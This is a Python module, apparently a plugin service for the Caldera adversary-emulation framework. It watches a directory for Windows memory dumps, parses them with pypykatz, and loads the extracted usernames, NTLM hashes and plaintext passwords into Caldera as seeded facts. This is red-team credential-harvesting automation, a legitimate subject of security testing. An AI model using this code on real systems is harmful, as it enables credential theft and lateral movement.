import os
import asyncio
from pypykatz.pypykatz import pypykatz

# Import correct pour Caldera v4+
from app.objects.secondclass.c_fact import Fact, OriginType

# ID de la source de facts "basic" où injecter les credentials
BASIC_SOURCE_ID = "ed32b9c3-9593-4c33-b0db-e2007315096b"

class DumpMonitorService:
    def __init__(self, directory, data_svc, knowledge_svc):
        self.directory = directory
        self.data_svc = data_svc
        self.knowledge_svc = knowledge_svc
        self.seen_files = set()

    async def watch_dumps(self):
        basic_sources = await self.data_svc.locate('sources', match=dict(id=BASIC_SOURCE_ID))
        basic_source = basic_sources[0] if basic_sources else None
        if not basic_source:
            print(f"[DumpMonitor] Source 'basic' introuvable (ID={BASIC_SOURCE_ID})")
            return

        print(f"[DumpMonitor] Surveillance du dossier {self.directory} pour les fichiers .dmp...")
        while True:
            try:
                for filename in os.listdir(self.directory):
                    if filename.lower().endswith(".dmp") and filename not in self.seen_files:
                        filepath = os.path.join(self.directory, filename)
                        self.seen_files.add(filename)
                        print(f"[DumpMonitor] Nouveau dump détecté: {filepath}")
                        await self._process_dump_file(filepath, basic_source)
                        await self._count_facts()
            except Exception as e:
                print(f"[DumpMonitor] Erreur lors de la surveillance du dossier: {e}")
            await asyncio.sleep(5)

    async def _process_dump_file(self, filepath, basic_source):
        try:
            mimi = pypykatz.parse_minidump_file(filepath)
        except Exception as e:
            print(f"[DumpMonitor] Échec de l'analyse de {filepath} : {e}")
            return

        hostname = None
        for luid, session in mimi.logon_sessions.items():
            if session.username and 'desktop' in session.username.lower():
                hostname = session.username.lower()

        processed_pairs = set()
        for luid, session in mimi.logon_sessions.items():
            creds = []
            for attr in ['msv_creds', 'wdigest_creds', 'ssp_creds', 'tspkg_creds', 'credman_creds']:
                creds.extend(getattr(session, attr, []))

            for cred in creds:
                username = getattr(cred, 'username', None)
                if not username:
                    continue

                nt_hash = getattr(cred, 'NThash', None) or getattr(cred, 'nt_hash', None)
                password = getattr(cred, 'password', None)
                ntlm_hash = nt_hash.hex() if isinstance(nt_hash, bytes) else str(nt_hash) if nt_hash else None
                password_str = password.hex() if isinstance(password, bytes) else str(password) if password else None

                if not password_str and (not ntlm_hash or ntlm_hash == "0" * 32):
                    continue

                cred_key = (username, ntlm_hash or "")
                if cred_key in processed_pairs:
                    continue
                processed_pairs.add(cred_key)

                try:
                    fact_user = Fact(trait="credential.username", value=str(username), score=1)
                    fact_user.source = BASIC_SOURCE_ID
                    fact_user.origin_type = OriginType.SEEDED
                    basic_source.facts.append(fact_user)
                    await self.knowledge_svc.add_fact(fact_user)
                    print(f"[DumpMonitor] ✅ Fact ajouté : credential.username = {username}")

                    if ntlm_hash:
                        fact_hash = Fact(trait="credential.ntlm_hash", value=ntlm_hash, score=1)
                        fact_hash.source = BASIC_SOURCE_ID
                        fact_hash.origin_type = OriginType.SEEDED
                        basic_source.facts.append(fact_hash)
                        await self.knowledge_svc.add_fact(fact_hash)
                        print(f"[DumpMonitor] ✅ Fact ajouté : credential.ntlm_hash = {ntlm_hash}")

                    if password_str:
                        fact_pass = Fact(trait="credential.password", value=password_str, score=1)
                        fact_pass.source = BASIC_SOURCE_ID
                        fact_pass.origin_type = OriginType.SEEDED
                        basic_source.facts.append(fact_pass)
                        await self.knowledge_svc.add_fact(fact_pass)
                        print(f"[DumpMonitor] ✅ Fact ajouté : credential.password = {password_str}")

                    if hostname and username.lower() == hostname:
                        fact_host = Fact(trait="host.username", value=str(hostname), score=1)
                        fact_host.source = BASIC_SOURCE_ID
                        fact_host.origin_type = OriginType.SEEDED
                        if not any(f.trait == "host.username" and f.value == fact_host.value for f in basic_source.facts):
                            basic_source.facts.append(fact_host)
                            await self.knowledge_svc.add_fact(fact_host)
                            print(f"[DumpMonitor] ✅ Fact ajouté : host.username = {hostname}")

                except Exception as e:
                    print(f"[DumpMonitor] ❌ Erreur lors de l'injection des facts pour {username} : {e}")

        print(f"[DumpMonitor] Extraction terminée pour {os.path.basename(filepath)}")

    async def _count_facts(self):
        try:
            all_facts = await self.knowledge_svc.get_facts(criteria={})
            print(f"[DumpMonitor] ✅ Total facts présents via knowledge_svc : {len(all_facts)}")
        except Exception as e:
            print(f"[DumpMonitor] ❌ Erreur lors du comptage des facts via knowledge_svc : {e}")

    async def purge_all_facts(self):
        try:
            all_facts = await self.knowledge_svc.get_facts(criteria={})
            for fact in all_facts:
                await self.knowledge_svc.delete_fact(criteria=dict(trait=fact.trait, value=fact.value))
            print(f"[DumpMonitor] 🧹 {len(all_facts)} facts supprimés de la base de connaissances.")
        except Exception as e:
            print(f"[DumpMonitor] ❌ Erreur lors de la suppression des facts : {e}")

